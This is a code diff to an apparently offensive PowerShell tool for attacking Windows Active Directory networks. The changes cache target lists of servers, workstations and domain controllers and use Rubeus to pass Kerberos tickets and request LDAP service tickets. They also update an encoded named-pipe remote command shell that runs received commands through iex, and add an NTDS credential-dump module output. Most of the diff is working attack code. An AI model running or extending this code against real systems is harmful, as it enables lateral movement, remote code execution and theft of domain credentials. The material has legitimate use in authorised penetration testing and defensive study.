@@ -136,9 +136,6 @@ if ($DomainJoined) {
 }
 
 if ($Flush){
-
-Write-Verbose "Flushing LDAP variables"
-
 $global:DomainAdmins = $null
 $global:EnterpriseAdmins = $null
 $global:ServerOperators = $null
@@ -147,6 +144,12 @@ $FQDNDomainPlusDomainAdmins = $null
 $FQDNDomainPlusEnterpriseAdmins = $null
 $FQDNDomainPlusServerOperators = $null
 $FQDNDomainPlusAccountOperators = $null
+
+# Target Variables
+$Global:TargetsServers = $null
+$Global:TargetsWorkstations = $null
+$Global:TargetsDomainControllers = $null
+$Global:TargetsAll = $null
 
 }
 
@@ -568,13 +571,24 @@ if (!$CurrentUser -or $SprayHash) {
 ################################################################################################################
 Function RestoreTicket{
 if (!$CurrentUser) {
+    
     Write-Verbose "Restoring Ticket"
     if ($Method -ne "GenRelayList"){
+    
     klist purge | Out-Null
     Start-sleep -Milliseconds 100
+    
     klist purge | Out-Null
     Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
-            
+    
+    try {
+    Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction "SilentlyContinue"
+    $DomainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
+    $PDC = $domainContext.PdcRoleOwner.Name
+    Write-Verbose "Creating LDAP TGS for $PDC"
+    Invoke-Rubeus "asktgs /service:LDAP/DC01.Security.local /ticket:$OriginalUserTicket /ptt" | Out-null
+} catch {}            
+        
         }
     }
 }
@@ -889,8 +903,8 @@ function New-Searcher {
     return $searcher
 }
 
-    if ($Method -ne "Spray") {
-        if (!$IPAddress) {
+if ($Method -ne "Spray") {
+    if (!$IPAddress) {
         $searcher = New-Searcher
         $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
 
@@ -899,42 +913,69 @@ function New-Searcher {
             $wildcardFilter = $Targets -replace "\*", "*"
             $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(dnshostname=$wildcardFilter))"
             $computers = $searcher.FindAll() | Where-Object {
-                $_.Properties["operatingSystem"][0] -ne "MacOS" -and
-                $_.Properties["operatingSystem"][0] -ne "MacOS X" -and
                 $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
             }
-        }
+        } 
+        
         elseif ($Targets -eq "Workstations") {
-            Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
-            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-            $computers = $searcher.FindAll() | Where-Object {
-                $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
-                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
-                
+            if ($Global:TargetsWorkstations -ne $null) {
+                $Computers = $Global:TargetsWorkstations | Select-Object *
+            } else {
+                Write-Verbose "Obtaining Workstations (Enabled) from LDAP query"
+                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                $computers = $searcher.FindAll() | Where-Object {
+                    $_.Properties["operatingSystem"][0] -notlike "*windows*server*" -and
+                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                }
             }
 
-        }
+            $Global:TargetsWorkstations = $computers | Select-Object *
+        
+        } 
+        
         elseif ($Targets -eq "Servers") {
-        Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
-            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-            $computers = $searcher.FindAll() | Where-Object {
-                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+            if ($Global:TargetsServers -ne $null) {
+                $computers = $Global:TargetsServers | Select-Object *
+            } else {
+                Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
+                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                $computers = $searcher.FindAll() | Where-Object {
+                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                }
             }
-            
-        }
+
+            $Global:TargetsServers = $computers | Select-Object *
+        
+        } 
+        
         elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
-            Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
-            $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-            $computers = $searcher.FindAll()
-            
-        }
-        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
-            Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
-            $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-            $computers = $searcher.FindAll() | Where-Object {
-                $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+            if ($Global:TargetsDomainControllers -ne $null) {
+                $computers = $Global:TargetsDomainControllers | Select-Object *
+            } else {
+                Write-Verbose "Obtaining Domain Controllers (Enabled) from LDAP query"
+                $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                $computers = $searcher.FindAll()
             }
-        }
+
+            $Global:TargetsDomainControllers = $computers | Select-Object *
+        
+        } 
+        
+        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
+            if ($Global:TargetsAll -ne $null) {
+                $computers = $Global:TargetsAll | Select-Object *
+            } else {
+                Write-Verbose "Obtaining all (Enabled) systems from LDAP query"
+                $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                $computers = $searcher.FindAll() | Where-Object {
+                    $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
+                }
+            }
+
+            $computers = $Global:TargetsAll = $computers | Select-Object *
+        
+        } 
+        
         elseif ($Targets -notmatch "\*") {
             if ($IsFile) {
                 $fileContent = Get-Content -Path $Targets
@@ -979,15 +1020,18 @@ function New-Searcher {
                     $computers = @()
                     RestoreTicket
                     continue
-                    
                 }
             }
         }
     }
-
-    $ComputerCount = ($Computers).count
+    
+    # Ensure we only have unique entries. Mostly to resolve duplicate entries from file
+    $computers = $computers | Select-Object -Unique *
+    
+    $ComputerCount = ($Computers).Count
     Write-Verbose "Total number of objects queried: $ComputerCount"
 }
+
 
 
 Write-Output ""
@@ -1370,7 +1414,7 @@ Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
 Write-Host "PipeName: $Global:PN"
 
 $SID = $Global:SID
-$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$ps.WaitForConnection();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 $b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 
 # Change the command string if the Method is WinRM
@@ -3818,6 +3862,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
+            try {$result = $result.Trim()} catch {}
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -3834,7 +3879,14 @@ do {
                 if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
+            }
+            
+            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
+                continue
             } 
+                         
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
@@ -3859,6 +3911,7 @@ do {
                         "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                         "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                         "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                         default          { $null }
                     }
 
@@ -3881,7 +3934,7 @@ do {
                 }
             } 
             elseif ($result -notmatch "[a-zA-Z0-9]") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             }
 
              # Dispose of runspace and close handle
@@ -4324,7 +4377,7 @@ function Send-UdpDatagram {
     $instanceFullNames
 }
 
- return Send-UdpDatagram -ComputerName $ComputerName
+ return  Send-UdpDatagram -ComputerName $ComputerName
 
 }
 
